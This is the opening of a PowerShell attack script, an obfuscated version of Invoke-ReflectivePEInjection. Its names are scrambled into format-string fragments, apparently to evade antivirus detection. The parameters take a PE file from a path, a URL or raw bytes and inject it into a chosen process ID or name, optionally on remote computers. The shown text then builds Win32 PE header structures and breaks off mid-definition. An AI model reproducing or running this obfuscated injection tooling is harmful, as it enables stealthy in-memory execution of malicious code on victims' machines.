${b`ZN}=  [TyPE]("{9}{5}{8}{2}{6}{1}{4}{3}{7}{10}{11}{12}{0}"-f'UtE','o','.iNtE','v','psEr','stEm.','R','iCEs.mArshAlA','RuNTIME','Sy','sAT','T','RIB');  SeT-itEm ('vAriAbL'+'e:uZt'+'A'+'O9') (  [tYPE]("{1}{2}{0}{5}{7}{3}{4}{6}" -F 'rUNT','SYSte','m.','OpSer','Vi','Ime.Inte','cES.UnmANAgedTYPe','r')  ) ;   ${t`cQs}=[TYpE]("{0}{1}"-f 'i','NT32') ;  Sv ("T4G"+"n7")  ([tyPe]("{0}{1}"-F'Boo','l')  );   ${J`Ina} =[Type]("{2}{0}{1}" -f 't','32','UIN') ;  seT-iteM VaRiAbLE:WCoB7  ([TypE]("{0}{1}{2}"-F 'Bi','TConveRt','ER'))  ;   ${P`15`lH} =  [TyPe]("{11}{5}{6}{4}{3}{10}{1}{9}{2}{0}{7}{8}"-F'E','e','cC','eMB','ectION.EMiT.ass','EM.reF','l','s','S','ra','lYbuiLD','SYst');sEt-iTEM  ('VAr'+'iAB'+'le:JbRPD') ([tYpE]("{6}{1}{0}{3}{4}{7}{2}{5}" -F 'rEflECT','TEM.','Nv','io','N.CALLi','eNtiOns','Sys','Ngco') ) ;    sEt-iTEM  ('vAr'+'i'+'aBLE:H2A') ([type]("{2}{0}{1}"-F 'DoMa','IN','apP')); ${5`Wq`ltP}=  [tyPe]("{2}{1}{0}"-f 'nmeNt','NViro','E')  ;    ${V`Fa9u}= [Type]("{1}{2}{0}" -f'ptr','u','Int'); sET-ITEm vARIABLe:YOLN ( [tYPE]("{1}{0}" -F'Ath','M'))  ;   ${lis`M`5T}  =[tyPE]("{4}{8}{5}{0}{2}{3}{6}{7}{1}{9}" -f 'e.Inter','S','OPser','v','Sy','m.rUNtIm','icE','S.mAR','stE','HAl') ;   ${8`zH}=[TyPe]("{2}{0}{1}" -F 'TPt','r','In')  ;  ${pGZ`eUq}  =  [TyPe]("{2}{3}{1}{0}" -f 'E','IL','SystEm.iO','.F')  ;function IN`VOk`E`-`RefLectiV`EpEin`j`ec`TIon
{


[CmdletBinding(defAuLtPARAmeTErsetnAmE={"{0}{2}{1}"-f 'We','le','bFi'})]
Param(
	[Parameter(PARaMetErSetnAME = "L`OCaLF`Ile", poSitIon = 0, MaNdAtORy = ${TR`UE})]
	[String]
	${Pep`A`Th},
	
	[Parameter(parAMetERSeTnAME = "WE`BfilE", POSiTIoN = 0, maNdAtORy = ${Tr`Ue})]
	[Uri]
	${pe`UrL},

    [Parameter(ParameTersETnAMe = "bY`TEs", PoSitioN = 0, MaNDaToRy = ${t`Rue})]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    ${PEby`T`eS},
	
	[Parameter(pOsition = 1)]
	[String[]]
	${coMP`UTe`R`NAmE},
	
	[Parameter(PoSition = 2)]
    [ValidateSet( {"{0}{1}" -f 'WSt','ring'}, {"{0}{2}{1}" -f'Str','g','in'}, {"{0}{1}"-f'Vo','id'} )]
	[String]
	${fUnCrE`TURNT`ype} = ("{1}{0}"-f'id','Vo'),
	
	[Parameter(pOsitiON = 3)]
	[String]
	${ex`e`Args},
	
	[Parameter(poSITIon = 4)]
	[Int32]
	${p`ROCId},
	
	[Parameter(posiTiON = 5)]
	[String]
	${pRoC`NamE},

    [Parameter(PoSITion = 6)]
    [Switch]
    ${F`ORCe`AslR}
)

&("{3}{2}{1}{0}" -f 'e','d','Mo','Set-Strict') -Version 2


${Re`motE`S`cR`IPT`BloCk} = {
	[CmdletBinding()]
	Param(
		[Parameter(pOSition = 0, mAnDATorY = ${t`Rue})]
		[Byte[]]
		${pEb`Y`Tes},
		
		[Parameter(pOSitIOn = 1, manDAtoRy = ${tR`UE})]
		[String]
		${fUNcReT`UR`N`TYPE},
				
		[Parameter(POsITIoN = 2, MAnDaTORY = ${T`Rue})]
		[Int32]
		${pro`cID},
		
		[Parameter(positiON = 3, ManDAtorY = ${T`RUe})]
		[String]
		${p`RoC`N`Ame},

        [Parameter(PoSiTION = 4, mANdAtORY = ${t`Rue})]
        [Bool]
        ${fO`R`cEAsLr}
	)
	
	
	
	
	Function gE`T-Wi`N32`TYpes
	{
		${W`i`N`32tyPeS} = &("{0}{2}{1}"-f 'Ne','ject','w-Ob') ("{3}{0}{2}{1}"-f 'e','bject','m.O','Syst')

		
		
		${DOm`A`In} =   ${h`2a}::"CUrr`eNTD`omAIN"
		${DynAMi`cass`Embly} = &("{1}{0}{2}"-f'w','Ne','-Object') ("{1}{3}{5}{0}{2}{4}" -f 'b','Sys','lyN','tem.Reflecti','ame','on.Assem')(("{2}{0}{1}" -f'ynamicAssem','bly','D'))
		${aSSEM`BL`y`B`UIL`deR} = ${d`o`MAIn}."d`eFIneD`YNAM`IcaSSE`mBly"(${dynA`mi`cASS`E`Mbly},   ${p`15`LH}::"r`Un")
		${mO`DuLEBuiLd`ER} = ${aS`sem`BLYB`UiLDER}.("{3}{0}{1}{2}"-f 'efineDy','na','micModule','D').Invoke(("{0}{1}{2}{3}" -f 'Dyna','m','icModu','le'), ${f`ALSE})
		${con`STrUCT`o`RI`NFo} =   (  GET-vArIable  ('B'+'zn')  ).vaLuE.("{2}{0}{1}{3}" -f'Cons','tru','Get','ctors').Invoke()[0]


		
		
		${t`y`PEBUILd`er} = ${mOdulEBu`iL`d`eR}.("{1}{2}{0}" -f 'neEnum','D','efi').Invoke(("{1}{2}{0}" -f 'ineType','M','ach'), ("{1}{0}" -f 'ic','Publ'), [UInt16])
		${T`yPEBUI`Ld`er}.("{0}{2}{1}{3}" -f 'De','ineLit','f','eral').Invoke(("{2}{1}{0}"-f 'e','v','Nati'), [UInt16] 0) | &("{0}{1}" -f 'Out','-Null')
		${tY`pEB`UIldeR}.("{2}{3}{0}{1}"-f'eLi','teral','D','efin').Invoke(("{0}{1}" -f'I38','6'), [UInt16] 0x014c) | &("{0}{2}{1}"-f 'Ou','ll','t-Nu')
		${Ty`P`e`BUILdeR}.("{3}{1}{0}{2}" -f'Lite','ne','ral','Defi').Invoke(("{0}{1}{2}"-f 'Ita','n','ium'), [UInt16] 0x0200) | &("{0}{1}{2}"-f 'Ou','t-','Null')
		${TYpeb`Ui`ldER}."D`EfINE`l`i`TeRAl"('x64', [UInt16] 0x8664) | &("{2}{1}{0}" -f'l','-Nul','Out')
		${MAChInE`Ty`pE} = ${tyP`e`BuI`LDer}.("{0}{1}{2}{3}" -f 'Create','Ty','p','e').Invoke()
		${wI`N32`TYpES} | &("{0}{1}{2}"-f'Add-Me','mbe','r') -MemberType ("{0}{1}{3}{2}" -f'Not','e','y','Propert') -Name ("{1}{2}{0}{3}"-f'ne','Mac','hi','Type') -Value ${mAchin`Et`y`pE}

		
		${Ty`pE`BUil`dEr} = ${M`OD`U`L`EbUILdEr}.("{1}{0}{2}"-f'e','Defin','Enum').Invoke(("{1}{2}{0}" -f 'e','M','agicTyp'), ("{1}{0}"-f 'c','Publi'), [UInt16])
		${tYp`eBui`Ld`eR}.("{1}{0}{2}" -f 'neL','Defi','iteral').Invoke(("{5}{0}{3}{7}{4}{1}{2}{6}" -f 'A','_M','AGI','GE_NT_OPTION','_HDR32','IM','C','AL'), [UInt16] 0x10b) | &("{1}{0}" -f'll','Out-Nu')
		${tY`peb`Uil`Der}.("{2}{0}{1}" -f'fineLite','ral','De').Invoke(("{7}{0}{6}{3}{2}{4}{1}{8}{5}" -f '_N','_MAG','TI','_OP','ONAL_HDR64','C','T','IMAGE','I'), [UInt16] 0x20b) | &("{2}{0}{1}" -f'Nu','ll','Out-')
		${MAG`i`cTY`pE} = ${TY`PEbuI`lDER}.("{2}{0}{1}" -f 'e','Type','Creat').Invoke()
		${win`3`2TYpes} | &("{1}{0}{2}" -f 'dd-M','A','ember') -MemberType ("{0}{3}{1}{2}" -f'N','pert','y','otePro') -Name ("{1}{0}{2}"-f 'icTy','Mag','pe') -Value ${ma`g`icTYPe}

		
		${T`Y`p`eBuilDER} = ${mO`DulE`BUIlD`eR}.("{0}{1}{2}{3}" -f 'D','ef','i','neEnum').Invoke(("{3}{4}{1}{0}{2}"-f'stemT','y','ype','S','ubS'), ("{1}{0}"-f'lic','Pub'), [UInt16])
		${ty`pEbUiL`DER}.("{0}{2}{1}{3}" -f 'D','L','efine','iteral').Invoke(("{1}{0}{2}{3}{5}{4}"-f 'E','IMAG','_S','UBSY','KNOWN','STEM_UN'), [UInt16] 0) | &("{1}{2}{0}" -f 'll','Out-N','u')
		${t`YPEB`UiL`Der}.("{1}{4}{2}{3}{0}" -f'al','D','neL','iter','efi').Invoke(("{4}{0}{6}{5}{3}{1}{2}"-f 'M','M_NATI','VE','STE','I','BSY','AGE_SU'), [UInt16] 1) | &("{0}{1}{2}" -f 'Ou','t-N','ull')
		${tyP`EbUIl`d`er}.("{3}{0}{1}{2}" -f'ineLit','era','l','Def').Invoke(("{1}{5}{6}{4}{3}{0}{2}{8}{7}"-f'DO','IMAGE_SU','WS','EM_WIN','T','BS','YS','UI','_G'), [UInt16] 2) | &("{2}{1}{0}" -f'll','ut-Nu','O')
		${T`yPEb`Ui`LdER}.("{2}{1}{4}{3}{0}"-f 'al','ine','Def','er','Lit').Invoke(("{5}{6}{1}{7}{4}{0}{2}{3}"-f'IN','GE','DO','WS_CUI','BSYSTEM_W','IM','A','_SU'), [UInt16] 3) | &("{1}{0}{2}"-f 't-N','Ou','ull')
		${Ty`PE`B`UILdeR}.("{0}{2}{1}" -f 'Define','l','Litera').Invoke(("{1}{0}{4}{2}{3}" -f '_SUBSYSTEM_PO','IMAGE','CU','I','SIX_'), [UInt16] 7) | &("{1}{0}"-f'ull','Out-N')
		${T`yPebUI`l`DeR}.("{2}{3}{0}{1}" -f'i','neLiteral','D','ef').Invoke(("{0}{1}{2}{5}{6}{7}{3}{4}"-f 'IM','A','GE_SU','DOW','S_CE_GUI','BSYS','TE','M_WIN'), [UInt16] 9) | &("{0}{2}{1}"-f 'Out','ull','-N')
		${TypE`BuiL`Der}.("{1}{0}{2}" -f'fineLite','De','ral').Invoke(("{5}{4}{3}{0}{1}{6}{7}{8}{2}"-f 'E','M_EF','ON','T','SYS','IMAGE_SUB','I_A','PPLICAT','I'), [UInt16] 10) | &("{1}{2}{0}"-f 'll','Out-','Nu')
		${TYpE`B`UIlDEr}.("{2}{1}{0}"-f 'eLiteral','efin','D').Invoke(("{0}{2}{8}{4}{5}{1}{6}{7}{3}{10}{9}" -f 'IMA','SYSTEM_E','GE_','T_SE','U','B','F','I_BOO','S','CE_DRIVER','RVI'), [UInt16] 11) | &("{2}{0}{1}" -f'ut-','Null','O')
		${TyP`EBUi`lDER}.("{0}{1}{2}{3}"-f 'Defin','e','Li','teral').Invoke(("{4}{9}{8}{0}{7}{3}{5}{10}{6}{1}{2}"-f 'UBSY','IV','ER','TEM','IM','_E','E_DR','S','E_S','AG','FI_RUNTIM'), [UInt16] 12) | &("{1}{0}"-f'll','Out-Nu')
		${tY`PebUI`ldeR}.("{1}{0}{2}"-f'er','DefineLit','al').Invoke(("{0}{1}{2}{4}{3}" -f'IMAGE_SUBSYSTEM_','EFI_','R','M','O'), [UInt16] 13) | &("{1}{0}"-f 'ull','Out-N')
		${T`yPeBuilD`er}.("{2}{1}{3}{0}"-f 'l','ter','DefineLi','a').Invoke(("{1}{0}{5}{6}{3}{4}{2}" -f 'AGE_S','IM','BOX','M_','X','UB','SYSTE'), [UInt16] 14) | &("{2}{1}{0}" -f'll','t-Nu','Ou')
		${SU`B`s`ySTe`MTYPe} = ${tYPeBuI`ld`ER}.("{0}{2}{1}" -f 'Cr','eType','eat').Invoke()
		${Win32t`Y`pEs} | &("{1}{0}{2}" -f 'em','Add-M','ber') -MemberType ("{1}{0}{2}{3}" -f 'eProp','Not','er','ty') -Name ("{3}{1}{0}{2}"-f 'ys','ubS','temType','S') -Value ${Subs`Y`sTeM`TypE}

		
		${tyPEbu`I`lD`ER} = ${m`O`DULEBU`ilDEr}.("{2}{0}{1}"-f'efin','eEnum','D').Invoke(("{5}{6}{1}{3}{0}{4}{2}" -f'acte','Cha','Type','r','ristics','Dl','l'), ("{0}{1}"-f 'Pub','lic'), [UInt16])
		${tYPE`Buil`DeR}.("{0}{2}{1}" -f 'D','fineLiteral','e').Invoke(("{1}{0}"-f'ES_0','R'), [UInt16] 0x0001) | &("{1}{0}"-f'l','Out-Nul')
		${ty`peBuIl`d`er}.("{2}{1}{0}{3}"-f'ite','ineL','Def','ral').Invoke(("{1}{0}" -f '_1','RES'), [UInt16] 0x0002) | &("{1}{0}" -f 'Null','Out-')
		${TY`p`EBUiLDER}.("{1}{2}{0}"-f'al','DefineLi','ter').Invoke(("{1}{0}" -f 'ES_2','R'), [UInt16] 0x0004) | &("{2}{1}{0}" -f 'll','t-Nu','Ou')
		${tY`peBu`i`lDEr}.("{0}{2}{1}"-f 'Define','teral','Li').Invoke(("{0}{1}" -f 'R','ES_3'), [UInt16] 0x0008) | &("{2}{1}{0}"-f 't-Null','u','O')
		${Type`B`UIL`DeR}.("{2}{1}{0}" -f 'ral','eLite','Defin').Invoke(("{4}{3}{1}{6}{5}{2}{0}" -f'SE','RACTERISTICS','BA','GE_DLL_CHA','IMA','MIC_','_DYNA'), [UInt16] 0x0040) | &("{0}{1}{2}" -f 'O','u','t-Null')
		${TYPEBu`IL`der}.("{2}{3}{0}{1}" -f 'eL','iteral','D','efin').Invoke(("{0}{5}{10}{9}{7}{6}{3}{2}{1}{8}{4}"-f 'I','O','ERISTICS_F','T','EGRITY','M','ARAC','LL_CH','RCE_INT','D','AGE_'), [UInt16] 0x0080) | &("{1}{2}{0}"-f 'Null','Ou','t-')
		${tYpe`BuiLd`er}.("{1}{2}{0}{3}"-f'tera','Def','ineLi','l').Invoke(("{5}{4}{2}{0}{3}{6}{1}"-f'T','COMPAT','AC','ERISTICS','L_CHAR','IMAGE_DL','_NX_'), [UInt16] 0x0100) | &("{0}{1}"-f'Out-N','ull')
		${type`BUi`l`dER}.("{3}{1}{2}{0}"-f 'teral','ne','Li','Defi').Invoke(("{1}{4}{6}{2}{5}{0}{3}"-f'ISOLAT','IMAG','_NO','ION','E_DLLCHARAC','_','TERISTICS'), [UInt16] 0x0200) | &("{1}{0}" -f 'ut-Null','O')
		${TYPe`BUi`LDER}.("{0}{1}{2}" -f'Def','ineLite','ral').Invoke(("{2}{0}{7}{6}{3}{5}{1}{4}" -f 'GE_DLL','_SE','IMA','TICS','H','_NO','RIS','CHARACTE'), [UInt16] 0x0400) | &("{0}{1}"-f'Out-','Null')
		${ty`P`Ebui`ldER}.("{3}{0}{4}{1}{2}" -f'fi','tera','l','De','neLi').Invoke(("{3}{0}{1}{4}{2}{5}{6}" -f 'GE_DLLCH','A','ERISTI','IMA','RACT','CS_NO_BIN','D'), [UInt16] 0x0800) | &("{0}{1}{2}" -f'Ou','t-N','ull')
		${TY`PEB`UIldeR}.("{1}{0}{2}" -f 'fineLi','De','teral').Invoke(("{1}{0}"-f '4','RES_'), [UInt16] 0x1000) | &("{1}{0}" -f'ut-Null','O')
		${tyPeB`U`iLDeR}.("{0}{2}{1}" -f 'D','Literal','efine').Invoke(("{2}{8}{6}{9}{0}{5}{3}{1}{4}{7}" -f'STI','_','IMAGE_DL','M','DRI','CS_WD','AC','VER','LCHAR','TERI'), [UInt16] 0x2000) | &("{0}{1}" -f 'Out-Nu','ll')
		${T`Y`peB`Uilder}.("{3}{2}{1}{4}{0}" -f 'teral','fi','e','D','neLi').Invoke(("{0}{1}{6}{9}{8}{5}{7}{2}{10}{3}{4}"-f 'IMAGE_DLLCHARA','C','L_SER','ER','_AWARE','_TER','T','MINA','ICS','ERIST','V'), [UInt16] 0x8000) | &("{1}{2}{0}" -f'-Null','O','ut')
		${DlL`ChARA`CTeR`IstICS`T`yPe} = ${t`ypEBuiLd`eR}.("{0}{1}{2}"-f 'C','re','ateType').Invoke()
		${W`iN`32TyPes} | &("{1}{2}{0}" -f 'ember','Add-','M') -MemberType ("{0}{3}{1}{2}" -f'N','p','erty','otePro') -Name ("{2}{4}{0}{1}{3}" -f 'Cha','racteri','Dl','sticsType','l') -Value ${DllCH`ARac`TERIStIcS`T`YPE}

		
		
		${a`TT`R`ibutES} = ("{2}{13}{1}{14}{12}{15}{0}{7}{11}{9}{4}{6}{10}{5}{3}{8}"-f 'blic,','la','AutoLayout,','FieldI','t, Sealed','re',', B',' Exp','nit','tLayou','efo','lici','a',' AnsiC','ss, Cl','ss, Pu')
		${Ty`PeBuI`L`Der} = ${MO`DUlEB`U`iLdeR}.("{2}{0}{1}"-f 'y','pe','DefineT').Invoke(("{0}{1}{4}{2}{3}"-f 'IMAGE_DA','TA_D','RECT','ORY','I'), ${aTTrI`BuT`eS}, [System.ValueType], 8)
		(${t`YPebU`ilDEr}.("{1}{3}{0}{2}"-f'l','De','d','fineFie').Invoke(("{2}{3}{1}{0}" -f 'ress','lAdd','Vi','rtua'), [UInt32], ("{0}{1}" -f 'Publ','ic'))).("{1}{0}"-f'Offset','Set').Invoke(0) | &("{1}{0}"-f'-Null','Out')
		(${t`yPeBU`i`lDer}.("{2}{1}{0}" -f 'eld','fineFi','De').Invoke(("{1}{0}"-f 'ze','Si'), [UInt32], ("{0}{1}" -f 'Publi','c'))).("{1}{3}{2}{0}"-f't','S','e','etOffs').Invoke(4) | &("{0}{1}"-f 'Out-Nu','ll')
		${Image_DA`Ta_`D`Ir`ec`T`orY} = ${t`yPE`BUilD`ER}.("{0}{3}{1}{2}"-f'C','eateT','ype','r').Invoke()
		${Wi`N`32tYpeS} | &("{0}{1}{2}" -f 'Add-','M','ember') -MemberType ("{2}{0}{1}"-f 'per','ty','NotePro') -Name ("{0}{1}{3}{4}{2}"-f'IMA','GE_','RECTORY','DAT','A_DI') -Value ${IM`Ag`e`_Data_DireC`TORy}

		
		${AtT`RIBuT`Es} = ("{10}{14}{5}{12}{13}{0}{6}{2}{11}{8}{1}{3}{9}{4}{7}"-f', Clas','nti',' Pu','alLayout, ','aled, BeforeField','o','s,','Init','Seque','Se','AutoL','blic, ','ut, AnsiCl','ass','ay')
		${TyP`EBu`iL`der} = ${M`OdULEBu`IlD`eR}.("{3}{1}{0}{2}" -f 'Ty','ne','pe','Defi').Invoke(("{2}{0}{1}{3}" -f 'E_F','ILE_HEAD','IMAG','ER'), ${aTtrI`BU`T`eS}, [System.ValueType], 20)
		${Typ`e`B`UILDer}.("{2}{1}{0}"-f 'd','Fiel','Define').Invoke(("{2}{0}{1}" -f'hin','e','Mac'), [UInt16], ("{1}{0}"-f'ic','Publ')) | &("{0}{1}"-f'Out-Nu','ll')
		${TYPEbui`L`Der}.("{1}{2}{0}"-f 'd','DefineF','iel').Invoke(("{1}{0}{2}"-f 'ectio','NumberOfS','ns'), [UInt16], ("{1}{0}" -f'ublic','P')) | &("{0}{1}" -f'Ou','t-Null')
		${TY`pEbu`ilDeR}.("{0}{2}{1}{3}"-f'D','fine','e','Field').Invoke(("{0}{1}{2}"-f 'TimeD','at','eStamp'), [UInt32], ("{1}{2}{0}" -f 'c','Pu','bli')) | &("{0}{1}{2}"-f'Out-N','ul','l')
		${T`ypEb`UILDER}.("{2}{1}{0}"-f 'eField','fin','De').Invoke(("{1}{3}{0}{2}" -f 'oSymbolTa','Poin','ble','terT'), [UInt32], ("{1}{0}" -f'lic','Pub')) | &("{0}{1}"-f'Out-','Null')
		${TYpe`BU`iLDEr}.("{1}{0}{2}{3}"-f'e','Defin','Fie','ld').Invoke(("{1}{3}{2}{0}" -f 's','NumberOf','mbol','Sy'), [UInt32], ("{1}{0}"-f'ic','Publ')) | &("{1}{0}" -f '-Null','Out')
		${tYpEbu`i`Ld`eR}.("{1}{0}{2}"-f'Fie','Define','ld').Invoke(("{1}{4}{0}{3}{2}" -f'ona','Si','er','lHead','zeOfOpti'), [UInt16], ("{1}{0}{2}" -f'l','Pub','ic')) | &("{2}{1}{0}" -f 'ull','t-N','Ou')
		${TYP`EB`Ui`LdER}.("{1}{2}{0}{3}" -f 'eFi','D','efin','eld').Invoke(("{2}{4}{3}{0}{1}"-f'tic','s','Ch','s','aracteri'), [UInt16], ("{0}{1}" -f 'Publ','ic')) | &("{1}{0}" -f'ull','Out-N')
		${IMA`Ge_F`IL`e_He`A`DeR} = ${t`YP`ebU`IlDer}.("{0}{1}{2}" -f'Crea','teTy','pe').Invoke()
		${Win32T`Y`P`eS} | &("{2}{1}{0}"-f'mber','e','Add-M') -MemberType ("{0}{1}{2}"-f'No','t','eProperty') -Name ("{3}{5}{0}{1}{2}{4}" -f 'LE_H','EA','D','IMAGE','ER','_FI') -Value ${imAG`e_`FilE_`H`eA`dER}

		
		${A`T`TRiBut`Es} = ("{12}{3}{16}{14}{5}{2}{8}{0}{17}{4}{6}{15}{13}{7}{1}{10}{9}{11}"-f'ass','fore','ass, ','t','l','ut, AnsiCl','i','plicitLayout, Sealed, Be','Cl','ldI','Fie','nit','Au','x','Layo','c, E','o',', Pub')
		${TYp`EB`UIldeR} = ${mo`du`lebu`ILdeR}.("{2}{0}{1}" -f'e','fineType','D').Invoke(("{5}{3}{1}{4}{2}{6}{0}" -f 'ER64','ION','HEA','GE_OPT','AL_','IMA','D'), ${ATT`Ri`BUTes}, [System.ValueType], 240)
		(${typE`B`UilD`Er}.("{1}{2}{0}{3}" -f'fineFie','D','e','ld').Invoke(("{1}{0}" -f'agic','M'), ${MA`G`IctyPE}, ("{0}{1}" -f 'Pu','blic'))).("{3}{2}{1}{0}"-f'et','Offs','t','Se').Invoke(0) | &("{0}{2}{1}"-f'Ou','-Null','t')
		(${typEbu`i`lder}.("{0}{1}{3}{2}" -f'Define','Fi','d','el').Invoke(("{1}{2}{3}{4}{0}" -f'sion','Ma','jor','Li','nkerVer'), [Byte], ("{2}{1}{0}"-f 'blic','u','P'))).("{1}{0}{2}"-f 'etOffse','S','t').Invoke(2) | &("{0}{2}{1}" -f 'Ou','Null','t-')
		(${t`YPeBuI`l`DEr}.("{0}{1}{2}" -f 'De','fin','eField').Invoke(("{0}{4}{3}{1}{2}"-f'M','si','on','LinkerVer','inor'), [Byte], ("{1}{0}"-f'c','Publi'))).("{2}{3}{1}{0}" -f 'et','fs','SetO','f').Invoke(3) | &("{2}{0}{1}"-f't-','Null','Ou')
		(${T`ypEBu`ild`ER}.("{1}{0}{2}" -f'neF','Defi','ield').Invoke(("{1}{0}{2}"-f'izeOfC','S','ode'), [UInt32], ("{1}{0}"-f'blic','Pu'))).("{0}{2}{1}" -f'Set','t','Offse').Invoke(4) | &("{0}{1}"-f 'Out-N','ull')
		(${TYPeBUi`l`DeR}.("{0}{2}{1}{3}" -f'De','Fiel','fine','d').Invoke(("{1}{5}{4}{0}{2}{3}" -f 'ali','SizeOfIn','zedD','ata','ti','i'), [UInt32], ("{1}{0}"-f 'c','Publi'))).("{0}{2}{1}"-f'Se','ffset','tO').Invoke(8) | &("{0}{2}{1}"-f'Out','l','-Nul')
		(${tYp`ebuILd`Er}.("{1}{2}{0}" -f'd','Defi','neFiel').Invoke(("{2}{0}{3}{1}" -f 'i','izedData','SizeOfUnin','tial'), [UInt32], ("{0}{1}"-f'P','ublic'))).("{2}{1}{0}"-f'fset','f','SetO').Invoke(12) | &("{1}{0}{2}"-f 'ut-Nul','O','l')
		(${T`YpEbUi`LdEr}.("{2}{0}{1}" -f'n','eField','Defi').Invoke(("{2}{3}{0}{4}{1}" -f'f','yPoint','Ad','dressO','Entr'), [UInt32], ("{1}{2}{0}" -f 'ic','Pub','l'))).("{0}{1}{2}"-f'S','etOffs','et').Invoke(16) | &("{1}{0}{2}"-f 'ut-Nul','O','l')
		(${typeBU`Il`D`eR}.("{0}{3}{2}{1}" -f 'Define','eld','i','F').Invoke(("{2}{0}{1}"-f'seO','fCode','Ba'), [UInt32], ("{1}{0}{2}"-f'bl','Pu','ic'))).("{1}{0}"-f 'fset','SetOf').Invoke(20) | &("{1}{0}" -f't-Null','Ou')
		(${TyPEb`U`IldeR}.("{3}{0}{1}{2}"-f'neF','i','eld','Defi').Invoke(("{2}{1}{0}" -f 'Base','age','Im'), [UInt64], ("{1}{0}"-f'c','Publi'))).("{1}{0}{2}"-f 'tOf','Se','fset').Invoke(24) | &("{0}{1}{2}" -f'O','ut-','Null')
		(${tyPe`B`Uild`eR}.("{0}{3}{1}{2}"-f 'Defi','Fie','ld','ne').Invoke(("{4}{2}{3}{1}{0}"-f'nment','ig','ctionA','l','Se'), [UInt32], ("{0}{1}" -f 'Publ','ic'))).("{2}{3}{0}{1}"-f'fse','t','S','etOf').Invoke(32) | &("{1}{2}{0}"-f 'l','Ou','t-Nul')
		(${tY`pebu`ildeR}.("{1}{2}{0}" -f'ld','Defin','eFie').Invoke(("{1}{2}{3}{0}" -f 'nt','FileA','lig','nme'), [UInt32], ("{0}{2}{1}"-f'Publ','c','i'))).("{0}{2}{1}"-f'SetO','t','ffse').Invoke(36) | &("{0}{1}"-f 'Out-Nul','l')
		(${T`YpE`BUildEr}.("{2}{0}{1}"-f 'eFie','ld','Defin').Invoke(("{6}{2}{3}{0}{4}{5}{1}"-f 'atingS','ion','Ope','r','ystemVer','s','Major'), [UInt16], ("{1}{0}{2}"-f'bli','Pu','c'))).("{0}{1}{2}" -f 'Set','O','ffset').Invoke(40) | &("{1}{0}{2}"-f't','Ou','-Null')
		(${TYP`EbuIld`er}.("{0}{3}{2}{1}" -f 'D','eld','eFi','efin').Invoke(("{5}{4}{0}{3}{2}{6}{7}{1}"-f'norOpe','n','ingSystemVer','rat','i','M','si','o'), [UInt16], ("{0}{2}{1}" -f'Pub','ic','l'))).("{3}{2}{1}{0}" -f 'fset','f','tO','Se').Invoke(42) | &("{2}{0}{1}"-f't-','Null','Ou')
		(${tyPe`Bu`ilD`Er}.("{1}{0}{2}" -f'e','Defin','Field').Invoke(("{1}{0}{2}{3}"-f'age','MajorIm','Versi','on'), [UInt16], ("{1}{2}{0}"-f'ic','P','ubl'))).("{0}{1}{2}" -f 'SetO','ffs','et').Invoke(44) | &("{0}{1}{2}"-f 'Out','-Nul','l')
		(${tYPe`BuIL`d`er}.("{3}{2}{0}{1}" -f 'n','eField','efi','D').Invoke(("{0}{2}{1}{3}" -f 'Mino','mage','rI','Version'), [UInt16], ("{1}{0}" -f 'ublic','P'))).("{0}{2}{1}" -f'SetOf','et','fs').Invoke(46) | &("{0}{1}" -f'Ou','t-Null')
		(${tY`PebU`ILd`eR}.("{1}{2}{0}"-f 'eField','Def','in').Invoke(("{4}{5}{1}{0}{3}{2}"-f 'ystem','Subs','ion','Vers','M','ajor'), [UInt16], ("{1}{0}"-f'lic','Pub'))).("{2}{1}{0}" -f'set','tOff','Se').Invoke(48) | &("{1}{0}" -f'ull','Out-N')
		(${TyP`e`BUILD`eR}.("{0}{1}{2}"-f'D','efineFie','ld').Invoke(("{1}{4}{3}{0}{2}"-f'e','MinorSubsy','rsion','mV','ste'), [UInt16], ("{0}{1}{2}" -f'Pu','bl','ic'))).("{1}{0}{2}"-f 'ffs','SetO','et').Invoke(50) | &("{0}{1}"-f'Out-N','ull')
		(${Ty`P`Ebu`iLdeR}.("{2}{1}{0}{3}" -f'iel','efineF','D','d').Invoke(("{3}{0}{2}{1}"-f 'n32V','onValue','ersi','Wi'), [UInt32], ("{1}{0}"-f'ic','Publ'))).("{0}{2}{1}"-f 'Se','ffset','tO').Invoke(52) | &("{0}{1}" -f'Out-Nul','l')
		(${T`YpebUi`ldER}.("{1}{2}{0}"-f'ld','Defin','eFie').Invoke(("{2}{1}{0}" -f'Image','zeOf','Si'), [UInt32], ("{0}{1}"-f'P','ublic'))).("{0}{1}" -f'S','etOffset').Invoke(56) | &("{1}{0}{2}"-f't-Nu','Ou','ll')
		(${TY`p`ebU`iLder}.("{1}{0}{2}" -f'fine','De','Field').Invoke(("{1}{2}{0}{4}{3}" -f 'OfH','Si','ze','rs','eade'), [UInt32], ("{1}{0}"-f 'lic','Pub'))).("{0}{1}{2}"-f 'Set','Of','fset').Invoke(60) | &("{1}{2}{0}" -f 'l','Ou','t-Nul')
		(${t`YPeBU`ildER}.("{1}{0}{2}"-f'eF','Defin','ield').Invoke(("{1}{0}" -f'ckSum','Che'), [UInt32], ("{1}{0}" -f'ic','Publ'))).("{0}{2}{1}"-f'SetOf','et','fs').Invoke(64) | &("{0}{1}" -f 'Out','-Null')
		(${tY`PEb`Ui`ldeR}.("{1}{0}{2}"-f'efin','D','eField').Invoke(("{2}{0}{1}"-f'e','m','Subsyst'), ${SubSYSt`em`T`yPE}, ("{1}{2}{0}" -f'blic','P','u'))).("{3}{1}{0}{2}" -f'e','etOffs','t','S').Invoke(68) | &("{0}{1}{2}"-f'Ou','t-Nul','l')
		(${typ`EBu`I`lDEr}.("{2}{0}{1}" -f 'efi','neField','D').Invoke(("{2}{3}{0}{1}" -f 'e','ristics','DllChara','ct'), ${dll`chA`R`A`C`TeR`IsTICSTyPE}, ("{1}{0}" -f'blic','Pu'))).("{1}{2}{0}" -f'ffset','S','etO').Invoke(70) | &("{1}{0}{2}"-f 'N','Out-','ull')
		(${T`Y`peBuIL`dER}.("{0}{3}{2}{1}"-f'De','ield','neF','fi').Invoke(("{4}{0}{3}{2}{1}" -f 'tac','erve','es','kR','SizeOfS'), [UInt64], ("{0}{2}{1}"-f'Pu','c','bli'))).("{2}{1}{0}"-f 't','Offse','Set').Invoke(72) | &("{1}{0}" -f 'Null','Out-')
		(${TypE`Bu`iLD`er}.("{2}{1}{0}" -f'd','el','DefineFi').Invoke(("{2}{1}{0}{3}" -f'tackCom','zeOfS','Si','mit'), [UInt64], ("{0}{1}"-f 'Publ','ic'))).("{1}{0}" -f'Offset','Set').Invoke(80) | &("{0}{2}{1}"-f'Out','ull','-N')
